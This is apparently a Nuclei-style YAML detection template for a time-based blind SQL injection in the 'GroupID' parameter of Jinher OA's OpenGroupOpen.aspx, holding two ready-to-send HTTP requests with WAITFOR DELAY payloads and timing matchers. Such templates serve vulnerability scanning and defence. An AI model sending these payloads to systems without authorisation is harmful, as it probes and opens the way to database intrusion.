id: poc-yaml-jinher-opengroupopen-aspx-sqli
info:
  name: "金和OA OpenGroupOpen.aspx SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA
  description: |
    金和OA OpenGroupOpen.aspx contains a SQL Injection vulnerability allowing attackers to exploit the 'GroupID' parameter.

http:
  - raw:
      - |
        GET /c6/Jhsoft.Web.AddMenu/OpenGroupOpen.aspx/?GroupID=1%27)waitfor+delay%270:0:5%27--&op=view HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /c6/Jhsoft.Web.AddMenu/OpenGroupOpen.aspx/?GroupID=1%27)waitfor+delay%270:0:8%27--&op=view HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "公开组公开范围状态查看"
          - "外部系统名称"
          - "成功标识"
          - "JHSoft"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
